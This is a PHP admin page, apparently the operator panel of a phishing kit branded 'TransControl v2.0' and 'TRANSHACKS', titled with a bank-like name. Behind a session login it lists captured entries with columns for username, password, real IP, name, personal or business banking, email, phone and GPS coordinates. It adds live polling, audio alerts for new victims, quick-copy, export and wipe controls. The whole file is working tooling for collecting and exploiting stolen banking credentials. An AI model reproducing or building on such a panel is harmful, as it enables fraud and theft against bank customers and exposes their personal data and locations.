<?php
session_start();

// Verificar si está logueado
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    header('Location: index.php');
    exit;
}

// Verificar permisos
$permisos = $_SESSION['admin_permisos'] ?? [];
if (!isset($permisos['ver_registros']) || !$permisos['ver_registros']) {
    header('Location: index.php?error=No tienes permisos para acceder');
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MifelinS.Control. | Registros</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="css/style.css?v=9">
    <link rel="stylesheet" href="css/responsive.css?v=1">
    <link rel="stylesheet" href="css/style_mobile.css?v=2">
    <link rel="stylesheet" href="css/modales_alertas.css">
    <link rel="stylesheet" href="css/tooltips.css">
    <link rel="stylesheet" href="css/theme_dark.css?v=8">
    <link rel="stylesheet" href="css/theme_light.css?v=7">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="js/theme_toggle.js?v=1"></script>
    <style>
        .nick-font {
            font-family: 'Outfit', sans-serif;
            font-weight: 600;
            font-size: 1.1em;
            text-transform: uppercase;
        }
        
        .bx-control-text {
            background: linear-gradient(90deg,rgb(112, 24, 24),rgb(253, 0, 0),rgb(255, 0, 0));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline;
        }
        
        .version-text {
            font-size: 0.6em;
            color: #9ca3af;
            vertical-align: top;
            font-weight: 400;
            margin-left: 2px;
        }
        
        /* Estilos para comentarios */
        .comentario-texto {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: inline-block;
            vertical-align: middle;
            cursor: text;
        }

        /* Estilos para el textarea de edición de comentarios */
        textarea.comentario-edit {
            min-width: 200px;
            max-width: 300px;
            font-size: 12px;
            line-height: 1.4;
            border: 1px solid #007bff;
            border-radius: 4px;
            padding: 4px 6px;
            resize: vertical;
            font-family: inherit;
        }

        textarea.comentario-edit:focus {
            outline: none;
            border-color: #0056b3;
            box-shadow: 0 0 0 2px rgba(0, 123, 255, 0.25);
        }

        /* Botón de editar comentario */
        .comentario-edit-btn {
            opacity: 0.6;
            transition: opacity 0.3s ease;
        }

        .comentario-edit-btn:hover {
            opacity: 1;
        }

        .banca-badge {
            display: inline-flex;
            align-items: center;
            padding: 3px 10px;
            border-radius: 9999px;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.03em;
            text-transform: uppercase;
            white-space: nowrap;
            line-height: 1.2;
        }

        .banca-badge--personal {
            background-color: #e8f0f8;
            color: #00438f;
        }

        .banca-badge--empresarial {
            background-color: #dff5f4;
            color: #006b68;
        }

        .gps-status-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 22px;
            height: 22px;
            line-height: 0;
        }

        .gps-status-icon__svg {
            display: block;
            width: 22px;
            height: 22px;
        }

        .gps-status-icon--ok {
            cursor: pointer;
        }

        .gps-status-icon--fail {
            cursor: help;
        }

        th[data-columna="coordenadas_gps"],
        td[data-columna="coordenadas_gps"] {
            width: 3.25rem;
            max-width: 3.25rem;
            padding-left: 0.5rem !important;
            padding-right: 0.5rem !important;
            text-align: center;
        }
    </style>
</head>
<body class="min-h-screen">
    <!-- Header -->
    <header class="bg-white shadow-sm border-b">
        <div class="w-full control-shell">
            <div class="control-header py-4">
                <div class="control-header__brand login-brand login-brand--header min-w-0">
                    <span class="brand-avatar" aria-hidden="true">TH</span>
                    <div class="login-brand-text">
                        <h1 class="text-xl font-semibold text-gray-800 nick-font leading-tight m-0">Trans<span class="bx-control-text">Control</span><span class="version-text">v2.0</span></h1>
                        <p class="login-brand-sub"><b>TRANS</b>HACKS</p>
                    </div>
                </div>
                <?php
                $nav_section = 'dashboard';
                require __DIR__ . '/includes/control_nav.php';
                ?>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="control-main w-full">
        <div class="dashboard-card control-card p-6">
            <!-- Search and Actions -->
            <div class="control-toolbar mb-6">
                <div class="control-toolbar__search relative" style="width: 50px; transition: width 0.3s ease;">
                    <button id="searchIconBtn" 
                            class="absolute inset-y-0 left-0 pl-3 flex items-center z-10 cursor-pointer hover:text-gray-600 transition-colors"
                            onclick="toggleSearchInput()">
                        <svg class="h-5 w-5 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
                        </svg>
                    </button>
                    <input type="text" 
                           id="searchInput" 
                           placeholder="Buscar registros"
                           class="search-input w-full pl-10 pr-4 py-2 search-input-collapsed">
                </div>
                <div class="control-toolbar__actions">
                    <div class="relative">
                        <button id="resultsPerPageBtn" 
                                onclick="toggleResultsDropdown()"
                                class="bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition-colors text-sm flex items-center">
                            <i class="fas fa-list mr-2"></i>
                            <span id="currentResultsText">10</span>
                            <i class="fas fa-chevron-down ml-2"></i>
                        </button>
                        <div id="resultsDropdown" 
                             class="absolute top-full left-0 mt-1 bg-white border border-gray-300 rounded-lg shadow-lg z-50 hidden min-w-full">
                            <button onclick="selectResultsPerPage(10)" 
                                    class="w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 rounded-t-lg">
                                10 por página
                            </button>
                            <button onclick="selectResultsPerPage(20)" 
                                    class="w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                                20 por página
                            </button>
                            <button onclick="selectResultsPerPage(50)" 
                                    class="w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100 rounded-b-lg">
                                50 por página
                            </button>
                        </div>
                    </div>
                    <div class="control-toolbar__icon-row">
                    <button onclick="togglePolling()" 
                            class="bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700 transition-colors">
                        <i class="fas fa-play"></i>
                    </button>
                    <button onclick="toggleAudioNotifications()" 
                            class="bg-gray-600 text-white px-4 py-2 rounded-lg hover:bg-gray-700 transition-colors">
                        <i class="fas fa-volume-up"></i>
                    </button>
                    <?php if (isset($_SESSION['admin_id']) && intval($_SESSION['admin_id']) === 1): ?>
                    <button onclick="vaciarRegistros()" 
                            class="bg-black text-white px-4 py-2 rounded-lg hover:bg-gray-800 transition-colors">
                        <i class="fas fa-trash-alt"></i>
                    </button>
                    <button onclick="exportData()" 
                            class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors">
                        <i class="fas fa-download"></i>
                    </button>
                    <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Error Container -->
            <div id="errorContainer" class="hidden mb-4"></div>

            <!-- Loading -->
            <div id="loading" class="hidden justify-center items-center py-8">
                <div class="loading-spinner w-8 h-8"></div>
                <span class="ml-3 text-gray-600">Cargando datos...</span>
            </div>

            <!-- Table -->
            <div class="overflow-x-auto">
                <table class="min-w-full divide-y divide-gray-200">
                    <thead class="bg-black">
                        <tr>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Estatus</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">ID</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Usuario</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Contraseña</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">IP Real</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Nombre</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Banca</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Email</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Teléfono</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Fecha</span></th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-black uppercase tracking-wider"><span class="header-text-shadow">Acciones</span></th>
                        </tr>
                    </thead>
                    <tbody id="tableBody" class="bg-white divide-y divide-gray-200">
                        <!-- Los datos se cargarán dinámicamente -->
                    </tbody>
                </table>
            </div>

            <!-- Pagination -->
            <div class="mt-4 flex justify-center">
                <div id="pagination" class="flex space-x-1">
                    <!-- La paginación se generará dinámicamente -->
                </div>
            </div>
        </div>
    </main>

    <!-- Sistema de Alertas -->
    <div id="alertOverlay" class="alert-overlay alert-hidden">
        <div id="alertContainer" class="alert-container">
            <div class="alert-header">
                <div id="alertIcon" class="alert-icon">
                    <i id="alertIconClass"></i>
                </div>
                <h3 id="alertTitle" class="alert-title">Título</h3>
            </div>
            <div id="alertContent" class="alert-content">
                Contenido del mensaje
            </div>
            <div class="alert-buttons">
                <button id="alertBtnSecondary" class="alert-btn alert-btn-secondary" onclick="hideAlert()">Cancelar</button>
                <button id="alertBtnPrimary" class="alert-btn alert-btn-primary" onclick="confirmAlert()">Aceptar</button>
            </div>
        </div>
    </div>

    <!-- Modal de Configuración de Columnas -->
    <?php if (isset($_SESSION['admin_id']) && intval($_SESSION['admin_id']) === 1): ?>
    <div id="columnConfigModal" class="fixed inset-0 bg-black bg-opacity-50 hidden items-center justify-center z-50 p-4">
        <div class="bg-white rounded-lg w-full max-w-2xl max-h-[90vh] flex flex-col">
            <!-- Header -->
            <div class="flex items-center justify-between p-6 border-b border-gray-200 flex-shrink-0">
                <h3 class="text-lg font-semibold text-gray-800">
                    <i class="fas fa-columns mr-2"></i>Configurar Columnas
                </h3>
                <button onclick="closeColumnConfig()" class="text-gray-500 hover:text-gray-700 text-xl">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            
            <!-- Content (scrollable) -->
            <div class="flex-1 overflow-y-auto px-6 py-4">
                <p class="text-sm text-gray-600 mb-4">Arrastra para reordenar. Marca/desmarca para mostrar/ocultar:</p>
                <div id="columnItemsContainer" class="space-y-2">
                    <!-- Los items se generarán dinámicamente con JavaScript -->
                </div>
            </div>
            
            <!-- Footer -->
            <div class="flex gap-3 p-6 border-t border-gray-200 flex-shrink-0">
                <button type="button" 
                        onclick="closeColumnConfig()" 
                        class="flex-1 bg-gray-600 text-white py-2 px-4 rounded-lg hover:bg-gray-700 transition-colors font-medium">
                    Cancelar
                </button>
                <button onclick="saveColumnConfig()" 
                        class="flex-1 bg-black text-white py-2 px-4 rounded-lg hover:bg-gray-800 transition-colors font-medium">
                    <i class="fas fa-save mr-2"></i>Guardar
                </button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php
    // Incluir configuración para obtener el nombre de la carpeta del panel
    require_once __DIR__ . '/../php_config/config.php';
    ?>
    <script>
        // Variable global para verificar permisos
        window.isSuperUser = <?php echo (isset($_SESSION['admin_id']) && intval($_SESSION['admin_id']) === 1) ? 'true' : 'false'; ?>;
        // Variable global para la ruta del panel de administración
        window.CONTROL_FOLDER_PATH = '<?php echo CONTROL_FOLDER_NAME; ?>';
    </script>
    <script src="js/column_drag_drop.js"></script>
    <script src="js/quick_copy.js"></script>
    <script src="js/audio_notifier.js"></script>
    <script src="js/tooltips.js"></script>
    <script src="js/app.js?v=20260806b"></script>
</body>
</html> 